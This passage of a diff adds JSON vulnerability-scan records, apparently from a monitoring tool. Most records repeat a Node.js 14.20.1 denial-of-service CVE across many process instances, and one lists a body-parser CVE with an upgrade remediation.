+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-802A069D81FAE069",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-085E02C3557D7D04",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-EB6A6AC2BD9ABBB4",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-258285CB5C64540D",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-B95A6F4794F9C0EE",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-18E9F28CBB6CD438",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-4B87B42A87E62A66",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-18E9F28CBB6CD438",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-CB115192DC85CCD0",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-18E9F28CBB6CD438",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-F3A0F889B3BB444C",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-18E9F28CBB6CD438",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-2675EF4AAE612A56",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-18E9F28CBB6CD438",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-2A849E526C6F651D",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-18E9F28CBB6CD438",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-C164602C33E5F915",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-18E9F28CBB6CD438",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-F0C19CA20CFCE31F",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-18E9F28CBB6CD438",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-C31B1A60097AF8F8",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-18E9F28CBB6CD438",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-1EDF6D7F36176A2D",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-18E9F28CBB6CD438",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-3C653B45A8906863",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-18E9F28CBB6CD438",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-3526D1C5E59A98DC",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-18E9F28CBB6CD438",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-F1CB128EDFE8BB53",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-18E9F28CBB6CD438",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-CAC22D334661B7CE",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-18E9F28CBB6CD438",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-E5BDE4F55DC8F386",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-18E9F28CBB6CD438",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-09D1D564CEF84E4D",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-18E9F28CBB6CD438",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-59783E8C6DF96A0D",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-18E9F28CBB6CD438",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-745803431705FE53",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-18E9F28CBB6CD438",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-03BC0893AD16A68E",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-18E9F28CBB6CD438",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-A4ECD018CD75D8E9",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-18E9F28CBB6CD438",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-D8CDC5C10813E80C",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14918852987963473554",
+      "affected_entity.id": "PROCESS_GROUP-4BF208BC328887D0",
+      "vulnerability.display_id": "S-1585",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 8.2,
+      "vulnerability.cvss.base_score": 8.2,
+      "vulnerability.references.cve": [
+        "CVE-2024-45590"
+      ],
+      "vulnerability.remediation.description": "Upgrade `body-parser` to version 1.20.3 or higher.",
+      "vulnerability.title": "Asymmetric Resource Consumption (Amplification)",
+      "vulnerability.type": "Asymmetric Resource Consumption (Amplification)",
+      "vulnerability.description": "Affected versions of this package are vulnerable to Asymmetric Resource Consumption (Amplification) via the `extendedparser` and `urlencoded` functions when the URL encoding process is enabled. An attacker can flood the server with a large number of specially crafted requests.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-1B9FD05898DC0602",
+      "affected_entity.vulnerable_component.name": "body-parser:1.19.0",
+      "vulnerability.references.cwe": [
+        "CWE-405"
+      ],
+      "vulnerability.parent.davis_assessment.score": 8.2,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "15035203721038707108",
+      "affected_entity.id": "PROCESS_GROUP-4BF208BC328887D0",
+      "vulnerability.display_id": "S-999",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.6,
+      "vulnerability.cvss.base_score": 8.8,
+      "vulnerability.references.cve": [
